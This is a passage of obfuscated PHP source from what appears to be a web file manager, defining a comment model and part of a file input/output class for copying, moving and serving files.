!0, 1); ActionCall($ÍšÉŞ†[1067], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\155\x65" => "\143\157\x6d\155\145\x6e\164\x5f\x6d\x65\x74\141", "\x6d\145\x74\x61\106\x69\145\x6c\x64" => "\143\x6f\x6d\x6d\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ğüûëÖö) { $ËÅ—ºÓî =& $_SERVER[å¸¿•¶£]; if ($ğüûëÖö[$ËÅ—ºÓî[1892]]) { $Ú¹È¼µô = $this->where(array($ËÅ—ºÓî[1893] => $ğüûëÖö[$ËÅ—ºÓî[1892]]))->find(); if (!$Ú¹È¼µô || $Ú¹È¼µô[$ËÅ—ºÓî[411]] != $ğüûëÖö[$ËÅ—ºÓî[411]] || $Ú¹È¼µô[$ËÅ—ºÓî[496]] != $ğüûëÖö[$ËÅ—ºÓî[496]]) { return !1; } $this->where(array($ËÅ—ºÓî[1893] => $ğüûëÖö[$ËÅ—ºÓî[1892]]))->setAdd($ËÅ—ºÓî[1894], 1); } $ğüûëÖö[$ËÅ—ºÓî[1895]] = 0; $ğüûëÖö[$ËÅ—ºÓî[1894]] = 0; $ğüûëÖö[$ËÅ—ºÓî[756]] = 1; return $this->add($ğüûëÖö); } public function commentCount($ØÅùÚıµ, $›ôÚ“€ı, $È”ø¬¯­ = false) { $‚ïä­ñË =& $_SERVER[å¸¿•¶£]; if (!$ØÅùÚıµ) { return array(); } if (is_string($ØÅùÚıµ) || is_int($ØÅùÚıµ)) { $ØÅùÚıµ = array($ØÅùÚıµ); } $Á»¡ïîè = array($‚ïä­ñË[496], $‚ïä­ñË[1896] => $‚ïä­ñË[491]); $Ê­ÌÛä½ = array($‚ïä­ñË[496] => array($‚ïä­ñË[7], $ØÅùÚıµ), $‚ïä­ñË[411] => $›ôÚ“€ı); if ($È”ø¬¯­) { $Ê­ÌÛä½[$‚ïä­ñË[1674]] = $È”ø¬¯­; } $ê®Ÿ€÷Ü = $this->field($Á»¡ïîè)->where($Ê­ÌÛä½)->group($‚ïä­ñË[496])->select(); return array_to_keyvalue($ê®Ÿ€÷Ü, $‚ïä­ñË[496], $‚ïä­ñË[491]); } public function starTarget($ÆÌóÀ·, $¡Ø‡¿èÃ) { $öÙª†— =& $_SERVER[å¸¿•¶£]; $úö¡Ü×ß = $ÆÌóÀ· + self::TYPE_STAR_OFFSET; $ôşóÒş‡ = array($öÙª†—[1674] => USER_ID, $öÙª†—[411] => $úö¡Ü×ß, $öÙª†—[496] => $¡Ø‡¿èÃ); $Ô¸©¢¤ı = $this->where($ôşóÒş‡)->find(); if ($Ô¸©¢¤ı) { return $this->where(array($öÙª†—[399] => $Ô¸©¢¤ı[$öÙª†—[399]]))->delete(); } $©ÕñÆ³ı = array($öÙª†—[1892] => 0, $öÙª†—[1674] => USER_ID, $öÙª†—[756] => 1, $öÙª†—[761] => $öÙª†—[12], $öÙª†—[411] => $úö¡Ü×ß, $öÙª†—[496] => $¡Ø‡¿èÃ, $öÙª†—[1895] => 0, $öÙª†—[1894] => 0); return $this->add($©ÕñÆ³ı); } public function starTargetCount($Ö­ïÜ‡Ş, $ìœ•Ş³å) { $áŠ´¥ =& $_SERVER[å¸¿•¶£]; $¨ôÇò´Š = $ìœ•Ş³å + self::TYPE_STAR_OFFSET; $ˆ¼à¯ = $this->commentCount($Ö­ïÜ‡Ş, $¨ôÇò´Š); $§‚ü¶¯ë = $this->commentCount($Ö­ïÜ‡Ş, $¨ôÇò´Š, USER_ID); return array($áŠ´¥[1897] => $ˆ¼à¯, $áŠ´¥[1898] => $§‚ü¶¯ë); } public function starTargetUserList($äğøæ¥Ô, $Í–£ƒ¾) { $Œ¢ãìÎÄ =& $_SERVER[å¸¿•¶£]; $ôÅØÌŸ = $äğøæ¥Ô + self::TYPE_STAR_OFFSET; $«ó‘†ªÏ = array($Œ¢ãìÎÄ[496] => $Í–£ƒ¾, $Œ¢ãìÎÄ[411] => $ôÅØÌŸ); $¡ÔãØ¸â = $this->where($«ó‘†ªÏ)->count(); $˜Œƒ¥¥¢ = array($Œ¢ãìÎÄ[255] => $¡ÔãØ¸â, $Œ¢ãìÎÄ[1899] => array()); if (!$¡ÔãØ¸â) { return $˜Œƒ¥¥¢; } $æ˜§ŸÓ = $this->field($Œ¢ãìÎÄ[1674])->where($«ó‘†ªÏ)->limit(500)->select(); $æ˜§ŸÓ = array_to_keyvalue($æ˜§ŸÓ, $Œ¢ãìÎÄ[12], $Œ¢ãìÎÄ[1674]); $˜Œƒ¥¥¢[$Œ¢ãìÎÄ[1899]] = Model($Œ¢ãìÎÄ[504])->userListInfo($æ˜§ŸÓ); return $˜Œƒ¥¥¢; } public function prasiseUserList($áò­´£ø) { $ßáÒôù =& $_SERVER[å¸¿•¶£]; $©êÖ­Øú = array($ßáÒôù[1900] => $áò­´£ø); $‚ĞÚ”Ùí = $this->where($©êÖ­Øú)->find(); $òùõŒÄˆ = _get($‚ĞÚ”Ùí, $ßáÒôù[1895], 0); $½óÇç = array($ßáÒôù[255] => $òùõŒÄˆ, $ßáÒôù[1899] => array()); if (!$òùõŒÄˆ) { return $½óÇç; } $Îî×ÏÙ = Model($ßáÒôù[1901])->field($ßáÒôù[1674])->where($©êÖ­Øú)->limit(500)->select(); $Îî×ÏÙ = array_to_keyvalue($Îî×ÏÙ, $ßáÒôù[12], $ßáÒôù[1674]); $½óÇç[$ßáÒôù[1899]] = Model($ßáÒôù[504])->userListInfo($Îî×ÏÙ); return $½óÇç; } public function remove($³Œ‡¬·Œ) { $¨ŠŒ»œ’ =& $_SERVER[å¸¿•¶£]; $œ¸ì½ø“ = array($¨ŠŒ»œ’[1893] => $³Œ‡¬·Œ); $âŸ÷Ş™Å = $this->where($œ¸ì½ø“)->find(); if ($âŸ÷Ş™Å[$¨ŠŒ»œ’[1892]]) { $this->where(array($¨ŠŒ»œ’[1893] => $âŸ÷Ş™Å[$¨ŠŒ»œ’[1892]]))->setAdd($¨ŠŒ»œ’[1894], -1); } return $this->where($œ¸ì½ø“)->delete(); } public function edit($¦°ú¢¢Ü, $Öè·¢‡Ì) { $»Êù˜Á =& $_SERVER[å¸¿•¶£]; $›­Ë°Åµ = array($»Êù˜Á[1893] => $¦°ú¢¢Ü); return $this->where($›­Ë°Åµ)->save(array($»Êù˜Á[1902] => $Öè·¢‡Ì)); } public function prasise($«‡±¢³‹) { $¶•ç€¦´ =& $_SERVER[å¸¿•¶£]; $ğ‹î„½¼ = Model($¶•ç€¦´[1903]); $‹³­–ÄŸ = array($¶•ç€¦´[1893] => $«‡±¢³‹, $¶•ç€¦´[1665] => USER_ID); $Ëá «•„ = $ğ‹î„½¼->where($‹³­–ÄŸ)->find(); if (!$Ëá «•„) { $ğ‹î„½¼->add($‹³­–ÄŸ); $“„ÌÉ´Ç = $this->where(array($¶•ç€¦´[1893] => $«‡±¢³‹))->setAdd($¶•ç€¦´[1895], 1); } else { $ğ‹î„½¼->where($‹³­–ÄŸ)->delete(); $“„ÌÉ´Ç = $this->where(array($¶•ç€¦´[1893] => $«‡±¢³‹))->setAdd($¶•ç€¦´[1895], -1); } return $“„ÌÉ´Ç; } public function targetInfo($¼ú¼‚ŠË, $ûÔÄÎ¯Ã) { $Š…©õ¯¾ =& $_SERVER[å¸¿•¶£]; $ƒø§ó»Ü = array($Š…©õ¯¾[576] => $¼ú¼‚ŠË, $Š…©õ¯¾[577] => $ûÔÄÎ¯Ã); $îî¾˜ŒÖ = $this->where($ƒø§ó»Ü)->count(); $û“ñµ¸Ô = "\x52\111\x47\110\124\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x63\157\x6d\x6d\145\156\164\137\x70\x72\141\151\163\x65\x20\163\164\141\x72\x20\157\x6e\x20\143\x6f\x6d\155\145\156\164\x2e\143\x6f\155\x6d\x65\156\164\111\x44\x20\x3d\x20\163\164\141\162\x2e\143\x6f\155\155\145\156\164\x49\x44"; $ñÎÀ˜¸± = $this->alias($Š…©õ¯¾[354])->where($ƒø§ó»Ü)->join($û“ñµ¸Ô, $Š…©õ¯¾[1904])->count(); $å¬‹‡² = array($Š…©õ¯¾[1905] => $îî¾˜ŒÖ, $Š…©õ¯¾[1906] => $ñÎÀ˜¸±); return $å¬‹‡²; } public function listData($Ûş¹ö¦») { $ö»³¥ğÏ =& $_SERVER[å¸¿•¶£]; if (isset($Ûş¹ö¦»[$ö»³¥ğÏ[1907]])) { if ($Ûş¹ö¦»[$ö»³¥ğÏ[1907]]) { $Ûş¹ö¦»[$ö»³¥ğÏ[1900]] = array($ö»³¥ğÏ[1021], intval($Ûş¹ö¦»[$ö»³¥ğÏ[1907]])); } unset($Ûş¹ö¦»[$ö»³¥ğÏ[1907]]); } if (isset($Ûş¹ö¦»[$ö»³¥ğÏ[1908]])) { if ($Ûş¹ö¦»[$ö»³¥ğÏ[1908]]) { $Ûş¹ö¦»[$ö»³¥ğÏ[1900]] = array($ö»³¥ğÏ[1018], intval($Ûş¹ö¦»[$ö»³¥ğÏ[1908]])); } unset($Ûş¹ö¦»[$ö»³¥ğÏ[1908]]); } return $this->_listData($Ûş¹ö¦»); } private function _listData($Ìô†ĞÆì) { $áêõš¾ø =& $_SERVER[å¸¿•¶£]; $æ™Ö¡¶ = $this->where($Ìô†ĞÆì)->_makeOrder()->selectPage(100); $this->_listAppendParent($æ™Ö¡¶[$áêõš¾ø[369]]); $this->_listAppendUser($æ™Ö¡¶[$áêõš¾ø[369]]); $this->_listAppendMeta($æ™Ö¡¶[$áêõš¾ø[369]]); return $æ™Ö¡¶; } private function _makeOrder() { $±ßÅ×• =& $_SERVER[å¸¿•¶£]; $ÄøÎ°ôÇ = array($±ßÅ×•[1895], $±ßÅ×•[1894], $±ßÅ×•[201]); $ÜªäôÛÙ = Input::get($±ßÅ×•[457], $±ßÅ×•[7], $±ßÅ×•[423], $ÄøÎ°ôÇ); $ÅçêÄö‡ = Input::get($±ßÅ×•[458], $±ßÅ×•[7], $±ßÅ×•[1667], array($±ßÅ×•[1909], $±ßÅ×•[453])); $ºÃ¢½…´ = $ÜªäôÛÙ . $±ßÅ×•[53] . $ÅçêÄö‡; return $this->order($ºÃ¢½…´); } private function _listAppendParent(&$ÛĞıÕ›³) { $Í½†ğ­¸ =& $_SERVER[å¸¿•¶£]; $Âô×¡‰‚ = array_unique(array_to_keyvalue($ÛĞıÕ›³, $Í½†ğ­¸[12], $Í½†ğ­¸[1892])); $Âô×¡‰‚ = array_remove_value($Âô×¡‰‚, $Í½†ğ­¸[198]); if (!$Âô×¡‰‚) { return; } $Ëš¾›Óû = $this->where(array($Í½†ğ­¸[1893] => array($Í½†ğ­¸[7], $Âô×¡‰‚)))->select(); $Ëš¾›Óû = array_to_keyvalue($Ëš¾›Óû, $Í½†ğ­¸[1900]); foreach ($ÛĞıÕ›³ as &$ºİşºøú) { if (isset($Ëš¾›Óû[$ºİşºøú[$Í½†ğ­¸[1892]]])) { $ºİşºøú[$Í½†ğ­¸[1910]] = $Ëš¾›Óû[$ºİşºøú[$Í½†ğ­¸[1892]]]; } } unset($ºİşºøú); } private function _listAppendUser(&$áğòÂëí) { $Ñº©’° =& $_SERVER[å¸¿•¶£]; $Ğş­ª—© = array_unique(array_to_keyvalue($áğòÂëí, $Ñº©’°[12], $Ñº©’°[1674])); $Ğş­ª—© = array_remove_value($Ğş­ª—©, $Ñº©’°[198]); if (count($Ğş­ª—©) == 0) { return; } foreach ($áğòÂëí as $©·ŠÀğ) { if (isset($©·ŠÀğ[$Ñº©’°[1910]])) { $Ğş­ª—©[] = $©·ŠÀğ[$Ñº©’°[1910]][$Ñº©’°[1674]]; } } $÷ÚÏ‘—ş = Model($Ñº©’°[525])->userListInfo($Ğş­ª—©); foreach ($áğòÂëí as &$©·ŠÀğ) { $©·ŠÀğ[$Ñº©’°[590]] = $÷ÚÏ‘—ş[$©·ŠÀğ[$Ñº©’°[1674]]]; if (isset($©·ŠÀğ[$Ñº©’°[1910]])) { $©·ŠÀğ[$Ñº©’°[1910]][$Ñº©’°[590]] = $÷ÚÏ‘—ş[$©·ŠÀğ[$Ñº©’°[1910]][$Ñº©’°[1674]]]; } } unset($©·ŠÀğ); } private function _listAppendMeta(&$²ÁÜ¨‰Ë) { $çğ€†Îó =& $_SERVER[å¸¿•¶£]; $û•Ï”ø‚ = array_unique(array_to_keyvalue($²ÁÜ¨‰Ë, $çğ€†Îó[12], $çğ€†Îó[1900])); $û•Ï”ø‚ = array_remove_value($û•Ï”ø‚, $çğ€†Îó[198]); if (!$û•Ï”ø‚) { return; } foreach ($²ÁÜ¨‰Ë as $‹•óà€ö) { if (isset($‹•óà€ö[$çğ€†Îó[1910]])) { $û•Ï”ø‚[] = $‹•óà€ö[$çğ€†Îó[1910]][$çğ€†Îó[1900]]; } } $Ñ¬Ó•Àš = $this->metaList($û•Ï”ø‚); if (!$Ñ¬Ó•Àš) { return !1; } foreach ($²ÁÜ¨‰Ë as &$‹•óà€ö) { $‹•óà€ö[$çğ€†Îó[466]] = $Ñ¬Ó•Àš[$‹•óà€ö[$çğ€†Îó[1900]]]; if (isset($‹•óà€ö[$çğ€†Îó[1910]])) { $‹•óà€ö[$çğ€†Îó[1910]][$çğ€†Îó[466]] = $Ñ¬Ó•Àš[$‹•óà€ö[$çğ€†Îó[1910]][$çğ€†Îó[1900]]]; } } unset($‹•óà€ö); } private function metaList($û›òùõ¶) { $”ÌÆ®Ù =& $_SERVER[å¸¿•¶£]; if (!$û›òùõ¶) { return array(); } $Ó•Äè¥ø = array($”ÌÆ®Ù[1900] => array($”ÌÆ®Ù[7], $û›òùõ¶)); $Áù¶ôŒ× = Model($”ÌÆ®Ù[1911])->where($Ó•Äè¥ø)->select(); $Áù¶ôŒ× = array_to_keyvalue_group($Áù¶ôŒ×, $”ÌÆ®Ù[1900]); foreach ($Áù¶ôŒ× as $İù›Š¥« => $«ˆùè£) { $ú®¥—€ç = array(); foreach ($«ˆùè£ as $¨¾¯ÍĞ‚) { $ú®¥—€ç[$¨¾¯ÍĞ‚[$”ÌÆ®Ù[94]]] = $¨¾¯ÍĞ‚[$”ÌÆ®Ù[374]]; } $Áù¶ôŒ×[$İù›Š¥«] = $ú®¥—€ç; } return $Áù¶ôŒ× ? $Áù¶ôŒ× : array(); } } goto Dë¸òªµ‰”; bèÓÆ¶¡Æç: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($şû½ŒÌ, $¡·„†ãÃ) { $Ö½‹úÍô =& $_SERVER[å¸¿•¶£]; $Ï¸ìñ¶â = $¡·„†ãÃ; $GLOBALS[$Ö½‹úÍô[1153]] = $Ö½‹úÍô[1154] . $şû½ŒÌ; Hook::trigger($Ö½‹úÍô[1154] . $şû½ŒÌ . $Ö½‹úÍô[1155], $Ï¸ìñ¶â); $Õûó¾¥ = self::driverMake($¡·„†ãÃ[0]); if (!$Õûó¾¥) { return !1; } if (method_exists($Õûó¾¥, $şû½ŒÌ)) { $ßõõÄ³µ = @call_user_func_array(array($Õûó¾¥, $şû½ŒÌ), $¡·„†ãÃ); } else { if (method_exists($Õûó¾¥, $Ö½‹úÍô[1156])) { $ßõõÄ³µ = @call_user_func_array(array($Õûó¾¥, $şû½ŒÌ), $¡·„†ãÃ); } else { if (method_exists(self, $şû½ŒÌ)) { $ßõõÄ³µ = @call_user_func_array(array(self, $şû½ŒÌ), $¡·„†ãÃ); } else { $ßõõÄ³µ = call_user_func_array(array(parent, $şû½ŒÌ), $¡·„†ãÃ); } } } Hook::trigger($Ö½‹úÍô[1154] . $şû½ŒÌ . $Ö½‹úÍô[1157], $Ï¸ìñ¶â, $ßõõÄ³µ); return $ßõõÄ³µ; } public static function init($æ·Áüƒ—) { return self::driverMake($æ·Áüƒ—); } public static function copy($ÈÓ§á‰, $ÊĞÛÓƒ‹, $Ñ¨±ÉÖô = false, $İ×šŠà€ = false) { return self::copyMoveStart($ÈÓ§á‰, $ÊĞÛÓƒ‹, $Ñ¨±ÉÖô, $_SERVER[å¸¿•¶£][546], $İ×šŠà€); } public static function move($öÂ¼œÓ, $ÔëàğÜ, $“ü¹©Üü = false, $ÜÃáõ¹ = false) { return self::copyMoveStart($öÂ¼œÓ, $ÔëàğÜ, $“ü¹©Üü, $_SERVER[å¸¿•¶£][548], $ÜÃáõ¹); } private static function copyMoveStart($ë™ô‚·å, $Áı§°Á„, $Ç„ŠŸë‚, $ºµ›¯¦, $á×äñ÷ê) { $ë¾²é‘ô =& $_SERVER[å¸¿•¶£]; $û¹ñ÷ã = array($ë™ô‚·å, $Áı§°Á„, $Ç„ŠŸë‚, $á×äñ÷ê); Hook::trigger($ë¾²é‘ô[1154] . $ºµ›¯¦ . $ë¾²é‘ô[1155], $û¹ñ÷ã); $ß½Ş›¡ï = self::copyMove($ë™ô‚·å, $Áı§°Á„, $Ç„ŠŸë‚, $ºµ›¯¦, $á×äñ÷ê); Hook::trigger($ë¾²é‘ô[1154] . $ºµ›¯¦ . $ë¾²é‘ô[1157], $û¹ñ÷ã, $ß½Ş›¡ï); return $ß½Ş›¡ï; } public static function saveFile($Á±®ò, $Šç¶š†ë, $Ó…æŒóæ = true) { $¨ğÄ«©Ê =& $_SERVER[å¸¿•¶£]; $Øœí—Âå = self::info($Šç¶š†ë); $ÏÅ°À’Ë = self::driverMake($Á±®ò); $’İ”ıñµ = self::driverMake($Šç¶š†ë); $ªæí«— = !1; if ($’İ”ıñµ->pathParse[$¨ğÄ«©Ê[1158]]) { $ªæí«— = $’İ”ıñµ; $¼˜ú§— = $’İ”ıñµ->pathParse[$¨ğÄ«©Ê[1158]]; $’İ”ıñµ = self::driverMake($¼˜ú§—); } if ($ÏÅ°À’Ë->pathParse[$¨ğÄ«©Ê[1158]]) { $êŞÅéİÉ = $ÏÅ°À’Ë->pathParse[$¨ğÄ«©Ê[1158]]; $ÏÅ°À’Ë = self::driverMake($êŞÅéİÉ); } $ñİÀ¬Ãì = $’İ”ıñµ->pathFather($Šç¶š†ë); $ƒšÓ‘è¦ = !0; if (!$Ó…æŒóæ && self::driverIsSame($ÏÅ°À’Ë, $’İ”ıñµ)) { $ƒšÓ‘è¦ = !1; } $ËØÀôçÏ = self::copyFile($ÏÅ°À’Ë, $Á±®ò, $’İ”ıñµ, $ñİÀ¬Ãì, $Øœí—Âå[$¨ğÄ«©Ê[32]], $ƒšÓ‘è¦); if ($ªæí«—) { $ËØÀôçÏ = $ªæí«—->getPathOuter($ËØÀôçÏ); } return $ËØÀôçÏ; } private static function copyMove($¸âşÊÓ, $ëÌæ¼½, $—ıÌÇ¤, $Æ†Ğè­Ø, $¾÷øôù¦ = false) { $¹çÊ² =& $_SERVER[å¸¿•¶£]; if (!$¸âşÊÓ || $¸âşÊÓ == $¹çÊ²[8] || !$ëÌæ¼½) { return !1; } ignore_timeout(); $¿–©ÄŞ¡ = self::driverMake($¸âşÊÓ); $°û™Ê× = self::driverMake($ëÌæ¼½); $œ¤µÑ¦¤ = $Æ†Ğè­Ø == $¹çÊ²[548]; $ç–¨‚á  = !1; if ($°û™Ê×->pathParse[$¹çÊ²[1158]]) { $ç–¨‚á  = $°û™Ê×; $ëÌæ¼½ = $°û™Ê×->pathParse[$¹çÊ²[1158]]; $°û™Ê× = self::driverMake($ëÌæ¼½); } if ($¿–©ÄŞ¡->pathParse[$¹çÊ²[1158]]) { $¸âşÊÓ = $¿–©ÄŞ¡->pathParse[$¹çÊ²[1158]]; $¿–©ÄŞ¡ = self::driverMake($¸âşÊÓ); } self::check($¿–©ÄŞ¡, $¸âşÊÓ, $°û™Ê×, $ëÌæ¼½); Hook::trigger($¹çÊ²[1159], $¿–©ÄŞ¡, $¸âşÊÓ, $°û™Ê×, $ëÌæ¼½); $ÂúœÏè² = self::driverIsSame($¿–©ÄŞ¡, $°û™Ê×); if ($ÂúœÏè²) { if ($Æ†Ğè­Ø == $¹çÊ²[548] && !method_exists($°û™Ê×, $¹çÊ²[1160]) && trim($ëÌæ¼½, $¹çÊ²[8]) == trim($°û™Ê×->pathFather($¸âşÊÓ), $¹çÊ²[8])) { if ($¿–©ÄŞ¡->pathThis($¸âşÊÓ) != $¾÷øôù¦ && !$¿–©ÄŞ¡->isTypeObject()) { return $¿–©ÄŞ¡->rename($¸âşÊÓ, $¾÷øôù¦); } return $°û™Ê×->getPathOuter($¸âşÊÓ); } if (method_exists($°û™Ê×, $Æ†Ğè­Ø)) { return $°û™Ê×->{$Æ†Ğè­Ø}($¸âşÊÓ, $ëÌæ¼½, $—ıÌÇ¤, $¾÷øôù¦); } } if ($ÂúœÏè² && $Æ†Ğè­Ø == $¹çÊ²[548] && $°û™Ê×->getType() == $¹çÊ²[106]) { $«©ËÈã® = $°û™Ê×->movePath($¸âşÊÓ, $ëÌæ¼½, $¾÷øôù¦); if ($«©ËÈã®) { return $«©ËÈã®; } } $úç÷›Í = $¿–©ÄŞ¡->isFile($¸âşÊÓ); if (!$úç÷›Í && $°û™Ê×->getType() == $¹çÊ²[764] && $¿–©ÄŞ¡->getType() == $¹çÊ²[106]) { $«©ËÈã® = $°û™Ê×->copyFolderFromIO($¿–©ÄŞ¡, $¸âşÊÓ, $ëÌæ¼½, $—ıÌÇ¤, $œ¤µÑ¦¤, $¾÷øôù¦); } else { $«©ËÈã® = self::copyPath($¿–©ÄŞ¡, $¸âşÊÓ, $°û™Ê×, $ëÌæ¼½, $—ıÌÇ¤, $œ¤µÑ¦¤, $úç÷›Í, $¾÷øôù¦); } if ($«©ËÈã® && $œ¤µÑ¦¤) { $¿–©ÄŞ¡->remove($¸âşÊÓ); } if ($ç–¨‚á ) { $«©ËÈã® = $ç–¨‚á ->getPathOuter($«©ËÈã®); } return $«©ËÈã®; } private static function check($úúİì†, $äìºúœÒ, $¾›ôæí–, &$ø’›Ï³¹) { $°äÂ„›ˆ =& $_SERVER[å¸¿•¶£]; if (self::driverIsSame($úúİì†, $¾›ôæí–) && $úúİì†->isFolder($äìºúœÒ) && $úúİì†->isParentOf($äìºúœÒ, $ø’›Ï³¹)) { show_json(LNG($°äÂ„›ˆ[1161]), !1); } if (!$úúİì†->exist($äìºúœÒ)) { show_json(LNG($°äÂ„›ˆ[105]), !1); } } private static function copyPath($˜éêÈãĞ, $ù÷¶à²Ï, $ˆì•‚¿, $ø˜¾¿ªÚ, $æ¸ëåØ¾, $ÙóĞ”ó, $¶† ğ•ç, $Äº¿é¹ú = false, $“Üù¶‰  = true) { $ÒÊø¦Òı =& $_SERVER[å¸¿•¶£]; $Ìáê¨ˆ” = empty($Äº¿é¹ú) && $Äº¿é¹ú !== $ÒÊø¦Òı[198] ? $˜éêÈãĞ->pathThis($ù÷¶à²Ï) : $Äº¿é¹ú; if ($æ¸ëåØ¾) { $¶÷åúÉè = $ˆì•‚¿->fileNameExist($ø˜¾¿ªÚ, $Ìáê¨ˆ”); $ôƒû­¸ = $Ìáê¨ˆ”; $Ìáê¨ˆ” = $ˆì•‚¿->fileNameAuto($ø˜¾¿ªÚ, $Ìáê¨ˆ”, $æ¸ëåØ¾, !$¶† ğ•ç); if (!$¶÷åúÉè || $ôƒû­¸ != $Ìáê¨ˆ”) { $æ¸ëåØ¾ = !1; } if ($“Üù¶‰  && !$æ¸ëåØ¾) { $ˆì•‚¿->_data[$ÒÊø¦Òı[1162]] = !0; } } if ($¶† ğ•ç) { return self::copyFile($˜éêÈãĞ, $ù÷¶à²Ï, $ˆì•‚¿, $ø˜¾¿ªÚ, $Ìáê¨ˆ”, $ÙóĞ”ó); } if ($æ¸ëåØ¾ == REPEAT_RENAME_FOLDER) { $æ¸ëåØ¾ = !1; } $¾û¬†ú» = rtrim($ø˜¾¿ªÚ, $ÒÊø¦Òı[8]) . $ÒÊø¦Òı[8] . $Ìáê¨ˆ”; $ÓÂ’º´¾ = $ˆì•‚¿->mkdir($ˆì•‚¿->getPath($¾û¬†ú»), $æ¸ëåØ¾); $ø˜¾¿ªÚ = $ˆì•‚¿->getPathInner($ÓÂ’º´¾); $Â×¦§üµ = $˜éêÈãĞ->listPath($ù÷¶à²Ï, !0); $Â×¦§üµ = is_array($Â×¦§üµ) ? $Â×¦§üµ : array($ÒÊø¦Òı[83] => array(), $ÒÊø¦Òı[82] => array()); $¿™øşÌÊ = array_merge($Â×¦§üµ[$ÒÊø¦Òı[83]], $Â×¦§üµ[$ÒÊø¦Òı[82]]); foreach ($¿™øşÌÊ as $è›úÓ³ï) { $åÖ×Ø—Û = $è›úÓ³ï[$ÒÊø¦Òı[33]] == $ÒÊø¦Òı[200]; $ù÷¶à²Ï = $˜éêÈãĞ->getPathInner($è›úÓ³ï[$ÒÊø¦Òı[84]]); $š¨²á„• = self::copyPath($˜éêÈãĞ, $ù÷¶à²Ï, $ˆì•‚¿, $ø˜¾¿ªÚ, $æ¸ëåØ¾, $ÙóĞ”ó, $åÖ×Ø—Û, !1, !1); if (!$š¨²á„•) { IO::errorTips($ÒÊø¦Òı[1163] . $ù÷¶à²Ï . $ÒÊø¦Òı[70] . $ø˜¾¿ªÚ); } } self::copyMoveKeepInfo($˜éêÈãĞ, $ù÷¶à²Ï, $ÓÂ’º´¾); return $ÓÂ’º´¾; } private static function copyFile($°€Æš­õ, $äˆ¼½—, $Öî¼èîş, $†ÖÂâ, $—œÃ§²¼, $§¡Ğ˜­) { $›š»é¿¯ =& $_SERVER[å¸¿•¶£]; $†ÖÂâ = $Öî¼èîş->getPath(rtrim($†ÖÂâ, $›š»é¿¯[8]) . $›š»é¿¯[8] . $—œÃ§²¼); $„İÚÑĞã = $›š»é¿¯[1164] . time() . rand_string(5); Hook::trigger($›š»é¿¯[1165], $°€Æš­õ, $äˆ¼½—, $Öî¼èîş, $†ÖÂâ, $—œÃ§²¼, $„İÚÑĞã); if (self::driverIsSame($°€Æš­õ, $Öî¼èîş)) { if ($§¡Ğ˜­) { $¬±Å¿İ¯ = $Öî¼èîş->moveFile($äˆ¼½—, $†ÖÂâ); } else { $¬±Å¿İ¯ = $Öî¼èîş->copyFile($äˆ¼½—, $†ÖÂâ); } Hook::trigger($›š»é¿¯[1166], $°€Æš­õ, $äˆ¼½—, $Öî¼èîş, $†ÖÂâ, $—œÃ§²¼, $¬±Å¿İ¯); self::copyMoveKeepInfo($°€Æš­õ, $äˆ¼½—, $¬±Å¿İ¯); return $¬±Å¿İ¯; } $çÂì§Œ£ = TEMP_FILES; if ($GLOBALS[$›š»é¿¯[6]][$›š»é¿¯[89]][$›š»é¿¯[803]]) { $çÂì§Œ£ = $GLOBALS[$›š»é¿¯[6]][$›š»é¿¯[89]][$›š»é¿¯[803]]; } $á†şÆ»’ = $çÂì§Œ£; mk_dir($á†şÆ»’); $Ç’æÜáŠ = $á†şÆ»’ . $„İÚÑĞã; $àáŠÃëÁ = $Ç’æÜáŠ; $Ç’æÜáŠ = $°€Æš­õ->download($äˆ¼½—, $Ç’æÜáŠ); $Ç’æÜáŠ = $°€Æš­õ->iconvApp($Ç’æÜáŠ); if (substr($Ç’æÜáŠ, strlen($çÂì§Œ£)) == $çÂì§Œ£) { $§¡Ğ˜­ = !0; } $¬±Å¿İ¯ = $Öî¼èîş->upload($†ÖÂâ, $Ç’æÜáŠ, $§¡Ğ˜­); self::remove($àáŠÃëÁ); Hook::trigger($›š»é¿¯[1166], $°€Æš­õ, $äˆ¼½—, $Öî¼èîş, $†ÖÂâ, $—œÃ§²¼, $¬±Å¿İ¯); self::copyMoveKeepInfo($°€Æš­õ, $äˆ¼½—, $¬±Å¿İ¯); return $¬±Å¿İ¯; } private static function copyMoveKeepInfo($Ã¦šÌè­, $È©¡Ò±å, $¶ú¨ş) { if (!$¶ú¨ş) { return; } $Ç¬û‡Ù‚ = $Ã¦šÌè­->info($È©¡Ò±å); if (!is_array($Ç¬û‡Ù‚)) { return; } IO::setModifyTime($¶ú¨ş, $Ç¬û‡Ù‚[$_SERVER[å¸¿•¶£][85]]); } public static function pathFather($ª¼ìÎˆÌ) { $’ÈÕ…Ÿ = IO::init($ª¼ìÎˆÌ); $İ­Š»• = $’ÈÕ…Ÿ->pathFather($’ÈÕ…Ÿ->path); return $’ÈÕ…Ÿ->getPathOuter($İ­Š»•); } public static function fileOut($ü‹ñ•¬€, $ªºÖğŠ = false, $¾¬Šœä— = false, $ïíüí‡¾ = '') { $ªüÖÍŠ² = self::driverMake($ü‹ñ•¬€); if ($ªüÖÍŠ²->isFileOutServer()) { return $ªüÖÍŠ²->fileOutServer($ü‹ñ•¬€, $ªºÖğŠ, $¾¬Šœä—, $ïíüí‡¾); } return $ªüÖÍŠ²->fileOut($ü‹ñ•¬€, $ªºÖğŠ, $¾¬Šœä—, $ïíüí‡¾); } public static function fileOutImage($™©ã¯İø, $àì¥ÂµÈ = 250) { $Èô…˜”§ = array(250, 600, 1200, 2000, 3000, 5000); for ($¹‹Šûç¤ = 0; $¹‹Šûç¤ < count($Èô…˜”§); $¹‹Šûç¤++) { if ($¹‹Šûç¤ == 0 && $àì¥ÂµÈ <= $Èô…˜”§[$¹‹Šûç¤]) { $àì¥ÂµÈ = $Èô…˜”§[$¹‹Šûç¤]; break; } else { if ($àì¥ÂµÈ > $Èô…˜”§[$¹‹Šûç¤ - 1] && $àì¥ÂµÈ <= $Èô…˜”§[$¹‹Šûç¤]) { $àì¥ÂµÈ = $Èô…˜”§[$¹‹Šûç¤]; break; } 